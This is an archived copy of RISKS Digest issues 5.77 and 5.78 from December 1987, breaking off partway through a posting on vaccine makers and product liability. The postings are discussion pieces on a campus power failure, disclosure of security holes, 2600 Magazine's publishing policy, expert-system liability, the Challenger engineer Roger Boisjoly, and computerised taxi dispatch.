http://catless.ncl.ac.uk:80/Risks/5.77.html 128.240.150.127 19970217014650 text/html 18819
HTTP/1.0 200 OK
MIME-Version: 1.0
Date: Mon, 17 Feb 1997 01:45:18 GMT
Server: phttpd/0.99.72
Content-Type: text/html
</DOCHDR>
<HTML><HEAD><TITLE>The Risks Digest Volume 5: Issue 77</TITLE>
<LINK REL="Prev" HREF="/Risks/5.76.html">
<LINK REL="Up" HREF="/Risks/index.5.html">
<LINK REL="Next" HREF="/Risks/5.78.html">
<LINK REL="Help" HREF="/Risks">
<LINK REV="made" HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">
</HEAD><BODY><HR>
<A HREF="/Risks/5.76.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.5.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/5.78.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
<H1>The Risks Digest Volume 5: Issue 77</H1>
<H2> Thursday, 17 December 1987 </H2>
    <H3>Forum on Risks to the Public in Computers and Related Systems</H3>
    <I><A HREF="http://www.acm.org">ACM</A>
Committee on Computers and Public Policy, Peter G. Neumann, moderator</I>
<H2>Contents</H2><DL>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj1">
Lessons from a power failure 
</A>
<DD>
<A HREF="#subj1.1">
Jerome H. Saltzer
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj2">
  Squirrels and other pesky animals 
</A>
<DD>
<A HREF="#subj2.1">
Frank Houston
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj3">
  Security failures should have unlimited distributions 
</A>
<DD>
<A HREF="#subj3.1">
Andy Freeman
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj4">
  2600 Magazine -- hackers, cracking systems, operating systems 
</A>
<DD>
<A HREF="#subj4.1">
Eric Corley
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj5">
  Re: can you sue an expert system? 
</A>
<DD>
<A HREF="#subj5.1">
Roger Mann
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj6">
  Re: Interchange of ATM cards 
</A>
<DD>
<A HREF="#subj6.1">
Douglas Jones
</A><br>
</DL>

<A NAME="subj1"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj1.1">
Lessons from a power failure
</A>
</H3>
<address>
&lt;<A HREF="mailto:">

</A>&gt;
</address>
<i>
Thu, 17 Dec 87 11:54:11 EST
</i><PRE>
From: Jerome H. Saltzer &lt;Saltzer@ATHENA.MIT.EDU&gt;

About three times each year, the Cambridge Electric Company provides M.I.T.
Project Athena an opportunity, at no extra charge, to check out its campus-
wide power failure resiliency and cold start capability.  The most recent
opportunity came one week ago.  We assume that Celco chose this particular
time because the last week of the Fall semester has everyone (both students
and Athena operations staff) stretched out about as thin as they ever get;
if you are going to do a stress test why not make it really stressful?

At 11:02 a.m. on December 10 a power glitch of about a half-second duration
took down 750 network workstations and 70 network servers of various types,
all nominally connected in a client-server architecture, and up to that
instant happily humming away doing last-minute homework assignments and
final term papers.  In the ensuing couple of hours we discovered two
interesting things.  (And of course we also learned--or I should say
relearned--a half dozen less interesting things, in the same general class
as remembering to keep your fire extinguishers charged.)  One of the
interesting things was bad (but repairable) news, the other one was good
news.  Both may be of interest to designers concerned with RISKS.

First, the bad news.  Our most recently introduced service is a network name
service that, among other things, provides automatic lookup to determine
which of 33 independent network file servers is holding your files.
Although it was intended to eventually run this network name service on a
set of small machines dedicated to just that purpose, we initially deployed
the name service as an extra process on three of our big file servers,
choosing three that were known to be lightly loaded because they also
provide file backup copying service.  We knew, but didn't think about, the
fact that the file backup copying servers were each configured with two
extra, large disk drives when compared with the other file servers.

The problem became apparent as we watched the system struggle back to its
feet after the power failure.  The network gateways were back on the air
within a few seconds; the 15 library file servers (since they export
read-only file systems) were mostly back on the air within five or ten
minutes, and then the 33 file servers that hold user files began to pop to
life.  Within 15 to 30 minutes most of them had checked out their file
systems and were ready for customers.  But no customers showed up, even
though almost all of the 750 workstations had dutifully rebooted themselves.
The reason is that the large-configuration backup servers were still picking
nits out of their three-disk file systems, and hadn't gotten to the point
where they could restart the name service that everyone else depended on to
figure out which file server to use.  About 45 minutes into the incident,
the first name server woke up, and a majority of users were back on the air,
after an unnecessary delay averaging perhaps 25 minutes.

Needless to say, we are expediting the installation of the small-configuration
name service hosts.  RISKS lesson: The independence of dedicated servers can
be one of the major benefits of a distributed server/client architecture, but
the benefit is only potential till you actually get around to doing it.

The good news was the discovery that there is an extra payoff in our
configuration of 33 independent, modest-sized (0.5 GB) file servers as
compared with, say, 4 giant file servers.  When only 31 of the 33 came back up
because a water cooling pump in one machine room didn't survive the power
glitch, only about 7% of our 5000 student customers were affected.  And most
important, we had enough spare capacity that we could consider reloading the
files from the latest backup tapes of those 2 servers elsewhere.  Fortunately,
the cooling pump got fixed before we had to do that, but the principle has
stuck in our minds.  It is similar to the principle in the electric power
industry that your system needs (at a minimum) spare or reserve generating
capacity of about the same magnitude as the largest single generating plant in
the system.  RISKS lesson: The smaller the largest server, the smaller the
reserve capacity you need to absorb its failure.
                 					Jerry Saltzer

</PRE>
<A NAME="subj2"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj2.1">
Squirrels and other pesky animals
</A>
</H3>
<address>
Frank Houston
&lt;<A HREF="mailto:houston@nrl-csr.arpa ">
houston@nrl-csr.arpa 
</A>&gt;
</address>
<i>
Thu, 17 Dec 87 10:46:22 est
</i><PRE>

It seems to me that the problem of pests infiltrating electrical and
electronic equipment is not news anymore.  Recall Grace Hopper's moth.

In my youth squirrels were a common cause of power interruptions when they 
would climb the utility pole and try to nest in the transformer  outside
of our house.   When I grew up and went to work in a development laboratory
I saw photos of a mouse that put some test equipment out of commission by
crawling inside and electrocuting itself on the power connections.  
If it had happened to Eniac, we might we might be demousing, not debugging.

Frank Houston [houston@nrl-csr.arpa]

</PRE>
<A NAME="subj3"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj3.1">
Security failures should have unlimited distributions
</A>
</H3>
<address>
Andy Freeman 
&lt;<A HREF="mailto:ANDY@Sushi.Stanford.EDU">
ANDY@Sushi.Stanford.EDU
</A>&gt;
</address>
<i>
Thu 17 Dec 87 01:38:22-PST
</i><PRE>
To: RISKS@KL.SRI.COM, pgarnet@NSWC-WO.ARPA

Summary: Crackers already talk to each other - clearinghouses can't
help them much.  The only people who can benefit from clearinghouses
are responsible system adminstrators.  No matter how broadly
clearinghouses distribute cracker techniques, it won't put systems run
by irresponsible system adminstrators at any more risk than they
already are.

Paul Garnet (pgarnet@csl.sri.com) writes:
    In Risks 5.71 Eugene Miya suggests 

    &lt; If we are ever going to progress out of the software muck, we are
    &lt; going to have to come up with mechanisms to replace all of our
    &lt; anecdotal information with better information.

    I agree.  One part of the 'software muck' is illicit code, e.g.,
    Trojan horses, viruses, etc.  It is EXTREMELY difficult to obtain any
    examples of illicit code, as any organization which has been bitten by
    one of these bugs does not want to be responsible for exacerbating the
    situation by letting the illicit code out to possibly infect another
    system.

    The software security community needs to study the diseases which we
    are trying to defend against, as potential defenses created in a
    vacuum of information will only work in a vacuum.  A clearinghouse,
    repository, library, or whatever name one wants to give to such a
    function should be set up so that those of us who are trying to build
    defenses can have subjects to study.

    There are, however, a number of sticky issues revolving about setting
    up such a clearinghouse.

    1) How do you trust the repository?  How does one know that
    information given to the repository will not be abused, nor will it be
    used against the giver?

If the information can be used again against the giver, it will be
regardless of whether the breached site tells anyone.  ("Fool me once,
shame on you, fool me twice, shame on me.")  The cracker still knows
and crackers talk to each other.

    2) How does the clearinghouse know who to disseminate which
    information to in order not to violate issue number 1?  How does one
    decide on who has a legitimate need to see 'dangerous' information,
    e.g., details on viruses, trap doors, etc.

See above.  The only defense comparable sites have is to find out as
quickly as possible about their holes; clearinghouses should be
available to everyone.  A few crackers will use the clearinghouse to
find out sooner than they would have otherwise, but immediate
unlimited distribution gives every responsible system administrator a
chance they don't have now to fix holes before cracker can slip
through.  Systems run by irresponsible sysadmins aren't in any more
danger when everyone, not just the crackers, knows about their holes.

    3) The clearinghouse must not be an information sink, sucking up
    information from anyone willing to donate their examples but never
    giving any information out.  It must be clear that the purpose of the
    clearinghouse is to facilitate the sharing of information in a non-
    threatening way.

See above.

    4) The clearinghouse must not be an organization that people are
    inherently scared of, "If I tell them what happened, what are they
    going to do to me?"

The clearinghouse should accept anonymous "here's how to crack
operating system x", so this isn't a problem.  Obviously, it shouldn't
distribute anonymous solutions - the real problem is validating
suggested fixes.  Nevertheless, clearinghouses that do nothing but
distribute "here's how to crack unix" information are valuable.

    5) There must be some mechanism to validate the information coming to
    the clearinghouse to insure that it is correct.  We do not want a
    repository of misleading, invalid data.

This is "easy" - all the clearinghouse has to do is try to crack a
similar system that has is secure against all previously disclosed
attacks.  If it breaks, publish the new hole, otherwise let people
know that if they aren't up to date, they're still vulnerable.
Perhaps there should be two types of clearinghouses.  One stores all
holes while the second keeps track of holes that have been rereported
in the past six months.

    6) Who's going to pay for this service?

Responsible system administrators will pay for subscriptions;
"evolution" will decrease the number who don't subscribe.  The real
problem is who is liable.  Irresponsible system administrators will
blame the clearinghouse even though it doesn't contribute to their
insecurity.  OS suppliers will be unthrilled too.  Both will sue.

I think there should be competing clearinghouses.  Some will
specialize and may even sell fixes - they can be validated the same
way any software vendor is.  (Some OS vendors will run
clearinghouses.)  Independents will keep them honest - they'll let
responsible system managers know there is a problem, and what it looks
like, even if their vendor won't admit that there is one, let alone
have a solution.

Many security failures are people failures.  A clearinghouse will only
highlight this.
                                    -andy

</PRE>
<A NAME="subj4"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj4.1">
2600 Magazine -- hackers, cracking systems, operating systems
</A>
</H3>
<address>
Eric Corley
&lt;<A HREF="mailto:cmcl2!phri!dasys1!ecorley@RUTGERS.EDU ">
cmcl2!phri!dasys1!ecorley@RUTGERS.EDU 
</A>&gt;
</address>
<i>
16 Dec 87 08:55:30 GMT
</i><PRE>

There has been some talk of an article that we have published in 2600
Magazine and I wanted to make clear the reasons for our publishing such an
article and what the purpose of our magazine is. The article in question is
a very well documented guide to VM/CMS, run on IBM machines. It explains how
the systems can be cracked, what the vulnerabilities are, and how a hacker
can find what he/she is looking for. We have printed the article in two
parts, the conclusion appearing in our latest issue.

2600 prints these articles because, quite frankly, people want to know these
facts. Most computer hackers are not of the malicious caliber and simply
explore systems to learn how they work. We find that a great many computer
operators benefit greatly from the bugs and quirks that we point out.

So, in short, we aren't printing these articles on computer operating
systems (UNIX, VAX, VM/CMS, VMS, etc.) and telephone systems (Sprint, MCI,
AT&amp;T, etc.) to help people break into them, NOR are we printing them to help
trap computer hackers--we simply want the information to be known. Thanks
for the opportunity to respond.

Eric Corley, Editor, 2600 Magazine, 2600@dasys1.UUCP, phri!dasys1!2600@nyu
(NOTICE: For those interested, 2600 is published quarterly and costs
$40 for a corporate sub, $15 for individual (delivered to your home)
subs. Back issues are also available. Write: 2600, PO Box 752-A, 
Middle Island, NY 11953. (516) 751-2600.)

Eric Corley                      {allegra,philabs,cmcl2}!phri\
Big Electric Cat Public Unix           {bellcore,cmcl2}!cucard!dasys1!ecorley
New York, NY, USA                               {sun}!hoptoad/         

</PRE>
<A NAME="subj5"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj5.1">
 Re: can you sue an expert system?
</A>
</H3>
<address>
Roger Mann 
&lt;<A HREF="mailto:RMann@HIS-PHOENIX-MULTICS.ARPA">
RMann@HIS-PHOENIX-MULTICS.ARPA
</A>&gt;
</address>
<i>
Wed, 16 Dec 87 13:09 MST
</i><PRE>
To: risks@csl.sri.com

No one has asked this question yet, so I will.  In the original question, the
expert system was a model of a financial advisory service that gives buy,
sell, and hold recommendations.  The question is:  can you sue a financial
advisory service ?  If not, then how can you sue the expert system that
represents that service.  If you can sue, what do advisory services do to
prevent themselves from paying out gobs of money to irate customers ?  Then,
from that, can expert system sellers protect themselves in the same fashion ?

</PRE>
<A NAME="subj6"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj6.1">
Re: Interchange of ATM cards
</A>
</H3>
<address>
Douglas Jones 
&lt;<A HREF="mailto:jones%cs.uiowa.edu@RELAY.CS.NET">
jones%cs.uiowa.edu@RELAY.CS.NET
</A>&gt;
</address>
<i>
Wed, 16 Dec 87 09:02:52 CST
</i><PRE>

The original law requiring that all off-premise ATMs in the state accept
ATM cards issued by any bank in the state was enacted in Iowa.  It was
immediately copied by North and South Dakota, and then by Wyoming.  As a
result, very soon after the introduction of ATMs, we had a 4 state uniform
network (named Shazam; symbol: an S with a lightning bolt through it,
making an interesting variant on the dollar sign).

Why other states have been slow to adopt this scheme is a puzzle, since the
convenience to the public is so great, and the costs to the banks are so small.

The one problem with the Iowa law is that on-premise ATMs are still allowed
to accept only their own brand of card, and with the public so used to free
interchange of cards, mistakes at these machines can be annoying.
Fortunately, the one time I was caught, the bank mailed my card to my home
bank unmutilated, unlike the problems that Wexelblat described.  The number
of such machines that reject (or keep) foreign cards appears to be
declining, probably because of the hassles they cause.
                              				  Douglas Jones

</PRE>

<IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"><P>
<A HREF="/Risks/5.76.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.5.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/5.78.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
Report problems with the web pages to <A HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">Lindsay.Marshall@newcastle.ac.uk</A>.
</BODY></HTML>
</DOC>
<DOC>
<DOCNO>WT11-B30-30</DOCNO>
<DOCOLDNO>IA012-000130-B022-437</DOCOLDNO>
<DOCHDR>
http://catless.ncl.ac.uk:80/Risks/5.78.html 128.240.150.127 19970217014704 text/html 28468
HTTP/1.0 200 OK
MIME-Version: 1.0
Date: Mon, 17 Feb 1997 01:45:31 GMT
Server: phttpd/0.99.72
Content-Type: text/html
</DOCHDR>
<HTML><HEAD><TITLE>The Risks Digest Volume 5: Issue 78</TITLE>
<LINK REL="Prev" HREF="/Risks/5.77.html">
<LINK REL="Up" HREF="/Risks/index.5.html">
<LINK REL="Next" HREF="/Risks/5.79.html">
<LINK REL="Help" HREF="/Risks">
<LINK REV="made" HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">
</HEAD><BODY><HR>
<A HREF="/Risks/5.77.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.5.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/5.79.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
<H1>The Risks Digest Volume 5: Issue 78</H1>
<H2> Friday, 18 December 1987 </H2>
    <H3>Forum on Risks to the Public in Computers and Related Systems</H3>
    <I><A HREF="http://www.acm.org">ACM</A>
Committee on Computers and Public Policy, Peter G. Neumann, moderator</I>
<H2>Contents</H2><DL>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj1">
Roger Boisjoly and Ethical Behavior 
</A>
<DD>
<A HREF="#subj1.1">
Henry Spencer
</A><br>
<A HREF="#subj1.2">
 Ronni Rosenberg
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj2">
  Computer aids taxi dispatch 
</A>
<DD>
<A HREF="#subj2.1">
Jeff Lindorff
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj3">
  Re: product liability 
</A>
<DD>
<A HREF="#subj3.1">
Martyn Thomas
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj4">
  Re: Expert systems liability 
</A>
<DD>
<A HREF="#subj4.1">
Jonathan Krueger
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj5">
  Re: Australian telecom blackouts and 'hidden' crimes 
</A>
<DD>
<A HREF="#subj5.1">
Jon A. Tankersley
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj6">
  Wall Street Kills The Messenger 
</A>
<DD>
<A HREF="#subj6.1">
Scot E. Wilcoxon
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj7">
  Expert systems; Ejection notice? 
</A>
<DD>
<A HREF="#subj7.1">
Steve Philipson
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj8">
  Squirrels, mice, bugs, and Grace Hopper's moth 
</A>
<DD>
<A HREF="#subj8.1">
Mark Mandel
</A><br>
</DL>

<A NAME="subj1"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj1.1">
Roger Boisjoly and Ethical Behavior
</A>
</H3>
<address>
&lt;<A HREF="mailto:mnetor!utzoo!henry@uunet.UU.NET">
mnetor!utzoo!henry@uunet.UU.NET
</A>&gt;
</address>
<i>
Fri, 18 Dec 87 04:41:38 EST
</i><PRE>

There has been a fair bit of back-and-forth over Roger Boisjoly et al. in
private mail [subsequent to <A HREF="/Risks/5.63.html">RISKS-5.63</A>,70,71], most of which is pretty
peripheral to Risks.  Herewith a straight chronology of verifiable events.
One or two personal notes are in brackets [].  Numbers in brackets are page
numbers in the Rogers report, "Report of the Presidential Commission on the
Space Shuttle Challenger Accident".  (Any library with any pretensions to
quality should have this; it is not an obscure technical report, but a
widely-distributed and not overly expensive book that is basic to real
understanding of the disaster.)  Quotes in single quotes are approximate,
double quotes are literal.

Dramatis Personae:

B = Roger Boisjoly, Morton-Thiokol engineer
L = Bob Lund, M-T VP engineering
H = George Hardy, NASA manager
M = Larry Mulloy, NASA manager
K = Joe Kilminster, M-T VP boosters
R = Stan Reinartz, NASA manager

The scene:  a teleconference between M-T Utah and two NASA centers, called
	to discuss the issue of cold vs. SRBs [107].

1. B: 'Don't launch.' [89]  L: 'Don't launch.' [90]

2. H: 'Argh.  But if contractor says don't launch, we won't.'  [Note NASA
	willingness to at least talk about not launching.] [90]

3. K: 'If the engineers say no, M-T says no.' [90]

4. M&amp;H: 'Argh.  We think it's not that bad.  We're impatient to launch.' [91-2]

5. K: 'We want a recess to talk about it.'  Done. [92]

6. Much discussion.  L told to put on his management hat. [93]

7. Teleconference resumes, same participants [including B]. [108]

8. K: 'Go ahead and launch.' [93]  B comments later in testimony:  "I did
	not agree with some of the statements that were being made to
	support the decision." [93]  [Note:  not just 'decision wrong' but
	'supporting arguments are lies'.]

9. R asks whether anyone in the teleconference has a different position or
	further comments. [96,100]

10.  ---&gt;  SILENCE  &lt;--- [96,100]  In particular, B is silent. [93]

11. Teleconference concludes.  B is unhappy but does nothing. [93]

12. Next morning:  manned space program in shambles, seven astronauts dead.

13. Later, in testimony, B:  "I felt I really did all I could to stop the
	launch." [93]


The reader will have to form his own opinions on whether Boisjoly was, in
these events, a heroic whistleblower risking his job for his principles,
or a dutiful company man who shut up when his management told him to shut up.
He clearly did become a whistleblower later... after the damage was done.

Henry Spencer @ U of Toronto Zoology {allegra,ihnp4,decvax,pyramid}!utzoo!henry

</PRE>
<HR><H3><A NAME="subj1.2">
Roger Boisjoly and Ethical Behavior 
</A>
</H3>
<address>
Ronni Rosenberg
&lt;<A HREF="mailto:ronni@CCA.CCA.COM ">
ronni@CCA.CCA.COM 
</A>&gt;
</address>
<i>
Fri, 18 Dec 87 15:23:48 EST
</i><PRE>

I am afraid I continue to disagree with Henry Spencer's interpretation.  It
appears that he condemns Boisjoly because Boisjoly did not speak out at the
teleconference after Morton Thiokol and NASA management decided to launch.
But Boisjoly had argued his point vigorously at that meeting.  NASA was part
of the teleconference and heard these arguments; much of this is left out of
the clipped, paraphrased excerpts from the Rogers report.  The fact that h
Boisjoly did not repeat his argument after Thiokol management clearly chose
to override it hardly seems like a worthwhile basis for such harsh criticism.

Also, it is simply wrong to say that Boisjoly did not take risks before the
teleconference.  With the possible exception of tenured faculty, anyone who
works in an organization takes a risk when criticizing management.  Boisjoly
did just that, repeatedly, with regard to the O-ring issue.  This is not the
behavior of a "dutiful company man"!  Continued criticism incurs management
disatisfaction, and Boisjoly increasingly was shunned and treated badly by his
managers and some colleagues; yet, he kept raising the issue.  The risks that
he took are clear when you hear him discuss these events at length, but not
when you read the "straight chronology of verifiable events" on which Spencer
appears to base his entire argument.  Eventually, critical behavior puts one's
job on the line.  Anyone who has worked at an organization should know the
very real risks of being a critic.

Before the teleconference, Boisjoly took all possible action within Morton
Thiokol.  He complained in writing to increasingly high levels of management,
up to the VP of Engineering.  As a direct result, Thiokol set up a group to
investigate potential problems with the O-rings.  Boisjoly says the company
did not assign enough resources for the group to collect adequate data.  Lack
of adequate resources is a common complaint.  However, the procedure of
setting up a group to investigate the problem was a reasonable one on the
company's part.  This procedure probably was a standard part of the company's
structure for resolving problems, and that corporate structure had resulted in
a successful shuttle program until then.  Boisjoly had no reason to think that
the structure would fail this time:  As an engineer, he was not in a position
to identify the organizational flaws that the Rogers commission later pointed
out.  Hence, it is not clear that he should have gone public at this time.

It was not until the teleconference -- when Boisjoly genuinely believed the
launch would be delayed -- that the lack of an adequate O-ring investigation
became a critical problem.  It is at this point that Spencer finds fault with
Boisjoly's lack of action.  Yet, Boisjoly did not merely "raise doubts."  He
argued vigorously against launch, presenting what data he had to support his
position, to both NASA and Morton Thiokol.  Others made the decision.  It was
clear that repeating his points would not have affected the decision.  He had
argued his points strongly, and it appeared that NASA and Thiokol management
wanted to override them.

In hindsight, it is easy to say he should have gone public at this point.  But
making ethical judgments in hindsight is unfair.  Spencer gives Boisjoly
little credit for going public later.  But without the testimony of critical,
in-house engineers, the Rogers commission had little chance of discovering the
truth.  It was Boisjoly's perception that the commission was not getting the
full story, so he risked his job and livelihood by testifying:  The evidence
shows that whistle-blowers are unwelcome in their own or other companies after
they go public with criticism of their company.

I believe Boisjoly did everything he was ethically obligated to do, by
speaking out at every available level and time to express his strong concerns
and, at the end, his strong feelings against launching.  By doing this, he
had nothing to gain, he endured censure within the company, and he took great
risks.  When he later went public, he risked his job and livelihood.  To say
he was wrong because he did not do this earlier is to say he should have been
a hero, not an average ethical human being.  I think an heroic standard of
behavior is unfair.  While it would have been ethically right to go public
earlier, I do not believe it was ethically wrong to postpone this heroic step.

</PRE>
<A NAME="subj2"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj2.1">
Computer aids taxi dispatch
</A>
</H3>
<address>
Jeff Lindorff
&lt;<A HREF="mailto:cae780!sequent!jeffl@sri-unix.ARPA ">
cae780!sequent!jeffl@sri-unix.ARPA 
</A>&gt;
</address>
<i>
Thu, 17 Dec 87 13:58:52 pst
</i><PRE>

Getting a cab in Portland, OR., may or may not be getting easier ...

(excerpted without permission from "The Oregonian")

IT'S NO LONGER CATCH AS CAB CAN -- COMPUTER SUPPLANTS RADIO DISPATCH --

Her name is Cathy, and better than anyone else she'll remember the week
Broadway Cab (in Portland, OR.) got its new computers.  She called the
company one recent night and asked to have a particular driver call her. A
message was sent over the company's brand-new computer system, but but it
was inadvertently relayed not to him alone, but to the entire fleet of cabs
on the road that night.  She received 31 phone calls and a lesson in what
happens with new computers, said Ed Stemwedel, night supervisor.

Things are changing around Broadway Cab. All 125 cabs in the company's fleet
are being equipped with the small screens of a computer that will locate and
assign a fare to the closest driver. The system will cost the company $500,000,
and still includes radios. Drivers, after all, still need to check for special
instructions. But the radios probably won't be used much.

Drivers generally seem to support the new system. It's more fair and efficient
and provides good protection against "theft" of fares by other cabs, several
drivers said a few days after getting the new computers. But things will be
different.

There have been some problems. Two, three, even as many as six cabs have been
showing up for one fare. There have been some long delays, sometimes an hour
or more. And some calls are being missed altogether. But those problems are the
result of human error more that anything else, said Warren Krupa, a dispatcher.

"The folks here don't know what we're doing yet" with the computers, he said.
"But every day, every shift, its better. It'll take a few days."

The computer system was built by Mobile Data International of Vancouver, 
British Columbia. The Broadway Cab system is the only one like it on the West
Coast of the United States. Vancouver, Houston, Dallas, Miami, and some New
York cab companies recently have started using a similar setup, according to
Denny Reed, Broadway Cab's marketing director.

</PRE>
<A NAME="subj3"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj3.1">
Re: product liability
</A>
</H3>
<address>
Martyn Thomas 
&lt;<A HREF="mailto:mcvax!praxis!mct@uunet.UU.NET">
mcvax!praxis!mct@uunet.UU.NET
</A>&gt;
</address>
<i>
Thu, 17 Dec 87 17:48:56 BST
</i><PRE>

In Risks 5/73 John Gilmore writes:
&gt;&gt; For imported goods, the original importer into the EEC is liable.
&gt; ..I am curious how long ... mcvax will last ... it may be the largest 
&gt;single channel for import of software.

I'm no lawyer, but I believe the liability will fall on the first company 
in the import chain which supplies the software as a business transaction.
I believe mcvax will escape liability, though anyone importing software by
this route and selling it on could be liable (under the UK Act).

&gt; Does Lloyds of London sell bug insurance?

Yes - they are one of the largest underwriters of product liability and
professional liability risks.  

&gt; It might be fun for someone to sue Praxis .....

Is this one of the RISKS of posting to this group?  Anyway, we're insured,
so sue away! :-)

Martyn Thomas, Praxis plc, 20 Manvers Street, Bath BA1 1PX UK.
Tel:	+44-225-444700.   Email:   ...!uunet!mcvax!ukc!praxis!mct 

</PRE>
<A NAME="subj4"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj4.1">
Re: Expert systems liability (<A HREF="/Risks/5.75.html">RISKS-5.75</A>)
</A>
</H3>
<address>
Jonathan Krueger
&lt;<A HREF="mailto:dgis!jkrueger@uunet.UU.NET ">
dgis!jkrueger@uunet.UU.NET 
</A>&gt;
</address>
<i>
Fri, 18 Dec 87 02:32:42 est
</i><PRE>

It's unreasonable to sell a product for general use when you know in advance
it will mislead anyone but a specialist.

&gt;Lawsuits are society's way of enforcing product specifications and warranties.

Aren't there some other ways? How about product testing and publication
of findings, product and manufacturer reputations and their relation to
repeat business or lack thereof, contractual remedies, buyer complaints
and buyer/seller negotiation, and buyer preference of distributors and
middlemen who expedite resolution of buyer complaints?

Of course, these depend on the seller's interests in cooperation; there
are sellers who won't cooperate.  But lawsuits have their limits too.
The buyer may sustain damages difficult to prove.  Statutes of
limitations expire.  The seller may go bankrupt or skip town.  He may
stall.  He may tie up the courts with legal maneuvering.

So neither lawsuits nor the alternatives can enforce product
specifications and warranties.  Not in the sense that helps an
individual buyer.  But, over the long run, don't suits force bad
companies to shape up?  In some cases.  Certainly the seller will act
to limit his liability; one way is to improve product quality. But
there are cases where all steps have been taken long ago, when product
quality is already as high as anyone knows how to make it.  At that
point the seller doesn't work to make his product meet the specs; he
pays his last settlement and simply chooses not to sell any more.

For instance, there used to be several polio vaccine manufacturers in
the U.S.  Today there is only one.  Probably within five years we'll
import the stuff.  There is no question that increased product
liability caused this.  The court cases are known, the history is well
documented, you can add up the costs yourself.  As I understand it,
with the highest quality vaccine, about one in ten million kids will
get a polio injection and it will kill him.  A few more will experience
severe side effects.  Millions of kids are injected every year.
Parents sue more these days.  As the settlements added up,
manufacturers decided one by one to leave the market.

How is the remaining U.S. vaccine manufacturer managing?  Well, it
raised the price to cover its losses.  In no sense has it been forced
to put its money where its mouth is; who do you think pays for public
vaccination?  The company plans to continue production as long as costs
from lawsuits are predictable enough to meet with price increases.

Has the buyer been protected?  Did we drive the shoddy manufacturers
out of the market?  No.  Product quality displayed a slight negative
correlation with court and settlement costs.  Essentially, quality was
as high as anyone could make it.  It gradually improved over the years,
including the years that manufacturers liability costs shot up.
